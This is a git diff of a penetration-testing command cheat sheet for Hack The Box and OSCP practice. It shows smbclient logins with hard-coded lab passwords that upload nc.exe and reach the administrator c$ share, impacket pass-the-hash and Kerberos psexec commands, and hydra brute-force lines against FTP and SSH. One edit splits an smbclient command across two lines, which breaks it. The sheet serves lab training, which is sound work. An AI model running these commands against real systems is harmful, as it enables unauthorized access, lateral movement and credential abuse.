@@ -1,6 +1,6 @@
 # Useful Commands for HTB/OSCP
 > **Website**: https://IslandDog.ky
-> **Last Update**: 06/25/21
+> **Last Update**: 07/14/21
 
 ## RustScan - #rustscan 
 ```bash
@@ -283,9 +283,10 @@ rpcinfo -p ${PWD##*/}
 #smbclient - Start here
 ```bash
 smbclient -N -L ${PWD##*/}
-smbclient -L \\\\[ip]
+smbclient -L \\\\${PWD##*/} -U 'Tiffany.Molina'
 smbclient -U 'tyler%92g!mA8BGjOirkL%OG*&' //${PWD##*/}/new-site -c 'put nc.exe nc.exe'
-smbclient -U 'administrator%u6!4ZwgwOM#^OBf#Nwnh' \\\\${PWD##*/}\\c$
+smbclient -U 'administrator%u6!4ZwgwOM#^OBf#Nwnh'
+\\\\${PWD##*/}\\c$
 ```
 #crackmapexec #password_spray
 ```bash
@@ -311,7 +312,7 @@ atexec.py <DOMAIN>/<USER>:<PASSWORD>@${PWD##*/} <COMMAND>
 
 #PTH - Pass the Hash
 ```bash
-psexec.py <DOMAIN>/<USER>@${PWD##*/} -hashes :<NTHASH>
+impacket-psexec -k Intelligence.htb/Administrator@dc.Intelligence.htb -no-pass
 wmiexec.py <DOMAIN>/<USER>@${PWD##*/} -hashes :<NTHASH>
 smbexec.py <DOMAIN>/<USER>@${PWD##*/} -hashes :<NTHASH>
 atexec.py <DOMAIN>/<USER>@${PWD##*/} -hashes :<NTHASH>
@@ -448,5 +449,5 @@ hydra -V -f -L users -P passwords ftp://${PWD##*/} -u -vV
 hydra -V -f -L users -P passwords ssh://${PWD##*/} -u -vV
 ```
 
-![[id.png|20x20]] IslandDog - Christopher Soehnlein 2021
+IslandDog - Christopher Soehnlein 2021
 https://IslandDog.ky
